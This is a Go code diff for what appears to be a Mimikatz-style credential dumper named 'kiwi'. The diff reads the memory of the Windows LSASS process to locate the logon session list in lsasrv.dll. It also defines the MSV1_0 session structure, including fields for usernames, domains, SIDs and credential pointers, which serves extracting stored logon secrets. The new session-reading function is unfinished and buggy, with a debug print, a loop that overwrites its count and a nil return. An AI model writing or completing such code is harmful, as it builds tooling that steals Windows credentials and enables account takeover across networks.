@@ -2,6 +2,7 @@ package kiwi
 
 import (
 	"bytes"
+	"fmt"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -139,24 +140,14 @@ var (
 
 // x86
 
-func (kiwi *Kiwi) searchSessionList(pHandle windows.Handle, patch *patchGeneric) error {
-	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
+func (kiwi *Kiwi) searchSessionListAddress(pHandle windows.Handle, patch *patchGeneric) error {
+	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
 	}
-	var mod *basicModuleInfo
-	for _, module := range modules {
-		if module.name == "lsasrv.dll" {
-			mod = module
-			break
-		}
-	}
-	if mod == nil {
-		return errors.New("failed to get module address about lsasrv.dll")
-	}
 	// read lsasrv.dll memory
-	memory := make([]byte, mod.size)
-	_, err = api.ReadProcessMemory(pHandle, mod.address, &memory[0], uintptr(mod.size))
+	memory := make([]byte, lsasrv.size)
+	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
@@ -166,7 +157,7 @@ func (kiwi *Kiwi) searchSessionList(pHandle windows.Handle, patch *patchGeneric)
 		return errors.WithMessage(err, "failed to search logon session list pattern")
 	}
 	// read logon session list address
-	address := mod.address + uintptr(index+patch.offsets.off0)
+	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset int32
 	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
@@ -175,12 +166,115 @@ func (kiwi *Kiwi) searchSessionList(pHandle windows.Handle, patch *patchGeneric)
 	logonSessionListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
 	kiwi.logf(logger.Debug, "logon session list address is 0x%X", logonSessionListAddr)
 	// read logon session list count
-	address = mod.address + uintptr(index+patch.offsets.off1)
+	address = lsasrv.address + uintptr(index+patch.offsets.off1)
 	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about logon session list count")
 	}
 	logonSessionListCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
 	kiwi.logf(logger.Debug, "logon session list count address is 0x%X", logonSessionListCountAddr)
+	kiwi.logonSessionListAddr = logonSessionListAddr
+	kiwi.logonSessionListCountAddr = logonSessionListCountAddr
 	return nil
+}
+
+type msv10List63 struct {
+	fLink         uintptr // point to msv10List63
+	bLink         uintptr // point to msv10List63
+	unknown0      uintptr
+	unknown1      uint32
+	unknown2      uintptr
+	unknown3      uint32
+	unknown4      uint32
+	unknown5      uint32
+	hSemaphore6   uintptr
+	unknown7      uintptr
+	hSemaphore8   uintptr
+	unknown9      uintptr
+	unknown10     uintptr
+	unknown11     uint32
+	unknown12     uint32
+	unknown13     uintptr
+	luid0         windows.LUID
+	luid1         windows.LUID
+	waZa          [12]byte
+	username      api.LSAUnicodeString
+	domainName    api.LSAUnicodeString
+	unknown14     uintptr
+	unknown15     uintptr
+	typ           api.LSAUnicodeString
+	sid           uintptr
+	logonType     uint32
+	unknown18     uintptr
+	session       uint32
+	logonTime     int64
+	logonServer   api.LSAUnicodeString
+	credentials   uintptr
+	unknown19     uintptr
+	unknown20     uintptr
+	unknown21     uintptr
+	unknown22     uint32
+	unknown23     uint32
+	unknown24     uint32
+	unknown25     uint32
+	unknown26     uint32
+	unknown27     uintptr
+	unknown28     uintptr
+	unknown29     uintptr
+	credentialMgr uintptr
+}
+
+type lsaEnum struct {
+	size                  uintptr
+	offsetToLUID          uint32
+	offsetToLogonType     uint32
+	offsetToSession       uint32
+	offsetToUsername      uint32
+	offsetToDomain        uint32
+	offsetToCredentials   uint32
+	offsetToSID           uint32
+	offsetToCredentialMgr uint32
+	offsetToLogonTime     uint32
+	offsetToLogonServer   uint32
+}
+
+// key = minimum windows build
+var lsaEnums = map[uint32]*lsaEnum{
+	buildMinWin10: {
+		size:         unsafe.Sizeof(msv10List63{}),
+		offsetToLUID: uint32(unsafe.Offsetof(msv10List63{}.luid0)),
+	},
+}
+
+func (kiwi *Kiwi) getSessionList(pHandle windows.Handle, patch *patchGeneric) ([]byte, error) {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.logonSessionListAddr == 0 {
+		err := kiwi.searchSessionListAddress(pHandle, patch)
+		if err != nil {
+			return nil, errors.WithMessage(err, "failed to search session list address")
+		}
+	}
+	// get session list count
+	var count uint32
+	address := kiwi.logonSessionListCountAddr
+	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to read session list count")
+	}
+	kiwi.log(logger.Debug, "logon session list count is", count)
+
+	fmt.Println(unsafe.Sizeof(msv10List63{}))
+
+	// get session list
+	for i := uint32(0); i < count; i++ {
+		address = kiwi.logonSessionListAddr
+		_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
+		if err != nil {
+			return nil, errors.WithMessage(err, "failed to read session list count")
+		}
+		break
+	}
+
+	return nil, nil
 }
